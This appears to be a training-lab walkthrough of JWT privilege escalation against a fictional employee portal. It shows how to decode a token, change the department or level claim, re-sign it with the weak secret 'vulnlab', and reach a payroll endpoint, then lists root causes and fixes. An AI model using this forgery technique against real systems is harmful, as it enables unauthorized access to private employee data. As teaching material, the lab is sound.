# JWT Lab — Employee Portal Privilege Escalation

## Lab Overview

This lab demonstrates a **JWT privilege escalation vulnerability** caused by weak signing secrets and over-trusting client-controlled JWT claims.

A support employee receives a JWT token after login. The application uses token claims to authorize access to sensitive payroll resources.

Your objective is to escalate privileges and retrieve confidential HR information.

---

## Vulnerability Type

JWT Misconfiguration / Broken Access Control

OWASP Category:

A01:2021 — Broken Access Control

A07:2021 — Identification and Authentication Failures

---

## Scenario

Employee account:

```text
Username:
alex

Password:
alex123
```

Normal employees should NOT access payroll systems.

Restricted users:

```text
Department = hr
OR
EmployeeLevel = L3
```

---

## Initial Login

Request:

POST

```text
/api/jwt/employee-login
```

Response:

```json
{
  "username":"alex",
  "department":"support",
  "employeeLevel":"L1"
}
```

JWT issued:

```text
eyJhbGc...
```

---

## Payroll Access Attempt

Request:

GET

```text
/api/jwt/payroll
```

Response:

```json
{
  "message":
  "Access denied",

  "currentAccess": {
      "department":"support",
      "employeeLevel":"L1"
  }
}
```

---

## Observation

Application reveals authorization requirements:

```text
Payroll portal is restricted
to HR staff or L3 employees
```

This leaks useful information to attackers.

---

## Decode JWT

Payload:

```json
{
  "username":"alex",
  "department":"support",
  "employeeLevel":"L1"
}
```

---

## JWT Tampering

Modify:

From:

```json
"employeeLevel":"L1"
```

To:

```json
"employeeLevel":"L3"
```

OR

From:

```json
"department":"support"
```

To:

```json
"department":"hr"
```

---

## Weak Secret Discovery

JWT signed using:

```text
vulnlab
```

Algorithm:

```text
HS256
```

Attacker re-signs modified JWT.

---

## Exploit Request

Send forged JWT:

```text
Authorization:
Bearer NEW_TOKEN
```

Request:

```text
GET /api/jwt/payroll
```

---

## Successful Exploitation

Response:

```json
{
  "message":
  "Payroll access granted",

  "payrollData": {
      "salary":"$115000",

      "department":"HR",

      "internalApiKey":
      "HR-API-2026-9XJ2"
  }
}
```

---

## Impact

Attacker gains:

✔ Payroll information

✔ Internal API keys

✔ Employee data

✔ Unauthorized privileged access

Possible consequences:

```text
Privilege escalation
Sensitive data exposure
Internal system compromise
```

---

## Root Cause

Application trusts JWT claims:

```text
department
employeeLevel
```

without strong secret management.

Weak signing key:

```text
vulnlab
```

allows token forgery.

---

## Secure Fixes

### Strong JWT secrets

Avoid:

```text
vulnlab
```

Use:

```text
Random 256-bit secrets
```

---

### Server-side authorization

Never trust:

```text
role
department
employeeLevel
```

directly from JWT claims.

Verify privileges in database.

---

### Least privilege access

Restrict payroll APIs using:

```text
RBAC
ABAC
```

---

## Learning Objectives

After completing this lab learners should understand:

- JWT structure
- JWT decoding
- Claims analysis
- Weak secret exploitation
- Token tampering
- Privilege escalation
- Broken access control

---

## Lab Information

Lab:

JWT Privilege Escalation — Employee Portal

Difficulty:

Medium

Category:

Authentication / Access Control

Status:

✔ Completed